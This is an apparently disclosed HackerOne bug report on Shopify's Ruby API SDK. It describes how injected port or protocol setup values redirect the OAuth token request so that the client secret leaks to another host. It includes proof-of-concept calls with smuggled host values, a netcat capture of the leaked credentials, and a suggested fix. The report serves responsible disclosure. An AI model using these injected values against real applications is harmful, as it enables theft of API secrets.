# H1514 Shopify API ruby SDK session setup lacks input validation, resulting in SSRF and leakage of client secret

## Report Details
- **Report ID**: 423437
- **URL**: https://hackerone.com/reports/423437
- **State**: Closed
- **Severity**: none
- **Submitted**: 2018-10-13T18:08:20.646Z
- **Disclosed**: 2019-04-05T13:44:34.501Z

## Reporter
- **Username**: jobert
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi team,

The [Shopify API ruby SDK](https://github.com/shopify/shopify_api) has the ability for the developer to interact with their shop's REST API. When setting up the gem, a code structure similar to the one below may be used to set up the connection:

```ruby
require 'shopify_api'

class SomeController < ApplicationController
  def index
    ShopifyAPI::Session.setup secret: '<secret>'

    session = ShopifyAPI::Session.new('some-shop.myshopify.com')

    access_token = session.request_token(params)
  end
end
```

When the `ShopifyAPI::Session` class is initialized, the following code is executed:

```ruby
def prepare_url(url)
  return nil if url.blank?
  # remove http:// or https://
  url = url.strip.gsub(/\Ahttps?:\/\//, '')
  # extract host, removing any username, password or path
  shop = URI.parse("https://#{url}").host
  # extract subdomain of .myshopify.com
  if idx = shop.index(".")
    shop = shop.slice(0, idx)
  end
  return nil if shop.empty?
  shop = "#{shop}.#{myshopify_domain}"
  port ? "#{shop}:#{port}" : shop
rescue URI::InvalidURIError
  nil
end
```

At the bottom, right above the `rescue` keyword, it can be observed that if a port is given, it is appended to the shop URL. This means that if the `setup` method is invoked with a `port` parameter, it'll be appended after the parsed hostname. Here is an example:

```
[1] pry(main)> require 'shopify_api'
=> true
[2] pry(main)> ShopifyAPI::Session.setup port: '80', secret: ''
=> {:port=>"80", :secret=>""}
[3] pry(main)> session = ShopifyAPI::Session.new("test.myshopify.com")
=> #<ShopifyAPI::Session:0x00007fc5b2051070 extra={}, token=nil, url="test.myshopify.com:80">
```

As can be seen above, the resulting instance variable called `url` now contains the given `port` value. When the `request_token` method is called, the following code gets executed:

```ruby
def access_token_request(code)
  uri = URI.parse("#{protocol}://#{url}/admin/oauth/access_token")
  https = Net::HTTP.new(uri.host, uri.port)
  https.use_ssl = true
  request = Net::HTTP::Post.new(uri.request_uri)
  request.set_form_data({"client_id" => api_key, "client_secret" => secret, "code" => code})
  https.request(request)
end
```

The problem that arises here, is that the URL gets parsed a second time and then uses the parsed information from the newly constructed URL instead of what the class was initialized with. This allows an attacker to inject an arbitrary domain through the `port` and `protocol` parameter when calling the `setup` method. An example:

```ruby
require 'shopify_api'

ShopifyAPI::Session.setup protocol: 'https', secret: '', port: '@127.0.0.1/?'

session = ShopifyAPI::Session.new('some-shop.myshopify.com')

access_token = session.request_token({'hmac' => 'd54d830d05601f0b4247f654e4c57b51318be655f40c7a7119141c98a23f6815', 'timestamp': '2000000000'})
```

The code above will exfiltrate the `client_secret`, `client_id`, and `code` to `127.0.0.1:443`. An excerpt of the captured request can be found below. The `hmac` above is a valid signature for the given timestamp (in a far distant future) and an empty secret.

```
$ nc -l -n -vv -p 443
Listening on [0.0.0.0] (family 0, port 443)
Connection from [127.0.0.1] port 443 [tcp/*] accepted (family 2, sport 60286)
POST /?/admin/oauth/access_token HTTP/1.1
Host: 127.0.0.1:443
Connection: Keep-Alive
Accept-Encoding: gzip
Content-Length: 29
Accept: */*
User-Agent: Ruby
Content-Type: application/x-www-form-urlencoded

client_id&client_secret=&code
```

The same can be achieved with the `protocol` parameter:

```ruby
ShopifyAPI::Session.setup protocol: 'https://127.0.0.1/?', secret: ''

session = ShopifyAPI::Session.new('some-shop.myshopify.com')

access_token = session.request_token({'hmac' => 'd54d830d05601f0b4247f654e4c57b51318be655f40c7a7119141c98a23f6815', 'timestamp': '2000000000'})
```

## Impact

This vulnerability can only be exploited if an attacker can influence the `port` or `protocol` parameter when given to the `setup` method. This seems to be rather unlikely to happen. However, I don't believe that the usage of a Gem should unnecessarily expose the user to arbitrary security vulnerabilities. Given that this may impact their local network and may leak their API keys, I decided to bring this to your attention.

Here's what a fix could look like:

```diff
diff --git a/lib/shopify_api/session.rb b/lib/shopify_api/session.rb
index 937bbd0..bd8fdaf 100644
--- a/lib/shopify_api/session.rb
+++ b/lib/shopify_api/session.rb
@@ -16,7 +16,18 @@ module ShopifyAPI
     class << self

       def setup(params)
-        params.each { |k,value| public_send("#{k}=", value) }
+        params.each do |key, value|
+          case key
+          when 'port', :port
+            sanitized_value = value.to_i
+          when 'protocol', :protocol
+            sanitized_value = protocol =~ /\Ahttps?\Z/ ? protocol : 'https'
+          else
+            sanitized_value = value
+          end
+
+          public_send("#{key}=", sanitized_value)
+        end
       end

       def temp(domain, token, &block)
```

## Attachments
No attachments
